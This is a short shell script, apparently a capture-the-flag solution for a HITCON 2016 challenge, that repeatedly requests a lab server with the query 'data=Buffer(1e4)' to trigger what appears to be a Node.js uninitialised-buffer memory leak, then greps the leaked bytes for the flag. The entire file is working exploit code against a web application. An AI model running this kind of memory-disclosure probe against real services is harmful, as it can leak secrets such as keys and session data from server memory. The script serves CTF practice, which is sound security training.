#!/usr/bin/env sh

# Author : Virink <virink@outlook.com>
# Date   : 2019/05/28, 15:28

count=1

while true;
do
	data=$(curl 'http://hitcon2016.local.virzz.com/?data=Buffer(1e4)' 2>/dev/null )
	if [[ ${#data} -gt 0 ]]; then
		echo "Count : $count"
		echo $data | grep -o -E "hitcon{.*?}" --color=auto
		if [[ $? -eq 0 ]]; then
			break
		fi
		let count=count+1
	else
		break
	fi
done


